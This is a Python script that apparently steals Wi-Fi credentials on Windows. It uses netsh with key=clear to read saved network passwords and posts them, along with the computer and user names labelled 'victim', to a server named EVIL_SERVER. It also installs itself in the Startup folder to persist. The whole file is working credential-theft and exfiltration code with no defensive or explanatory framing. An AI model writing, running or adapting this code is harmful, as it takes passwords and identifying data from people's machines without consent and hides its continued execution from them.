import subprocess
import json
import requests
import os
import sys
from config import *
def get_wifi_profiles():
    profiles = []
    try:
        output = subprocess.check_output(
            "netsh wlan show profiles",
            shell=True,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        for line in output.split('\n'):
            if "All User Profile" in line:
                profile_name = line.split(":")[1].strip()
                try:
                    cmd = f'netsh wlan show profile name="{profile_name}" key=clear'
                    profile_output = subprocess.check_output(
                        cmd,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True
                    )
                    password = "Not found"
                    for profile_line in profile_output.split('\n'):
                        if "Key Content" in profile_line:
                            password = profile_line.split(":")[1].strip()
                            break
                    profiles.append({
                        "ssid": profile_name,
                        "password": password,
                        "system": os.environ['COMPUTERNAME'],
                        "user": os.environ['USERNAME']
                    })
                except subprocess.CalledProcessError:
                    continue
    except Exception as e:
        print(f"Error: {e}")
    return profiles
def send_to_server(profiles):
    try:
        headers = {'Content-Type': 'application/json'}
        payload = {
            "victim": os.environ['COMPUTERNAME'],
            "user": os.environ['USERNAME'],
            "networks": profiles,
            "timestamp": subprocess.check_output(
                "echo %date% %time%",
                shell=True,
                universal_newlines=True
            ).strip()
        }
        response = requests.post(
            f"{EVIL_SERVER}/collect",
            data=json.dumps(payload),
            headers=headers,
            timeout=10
        )
        if response.status_code == 200:
            print(f"Successfully sent {len(profiles)} networks to server!")
        else:
            print(f"Server responded with status: {response.status_code}")
    except Exception as e:
        print(f"❌ Failed to send data: {e}")
def persist_execution():
    startup_path = os.path.join(
        os.environ['APPDATA'],
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    script_path = sys.argv[0]
    os.path.join(startup_path, "WiFiHelper.exe")
    with open(os.path.join(startup_path, "wifi_launcher.bat"), "w") as f:
        f.write(f'@echo off\npython "{script_path}"\n')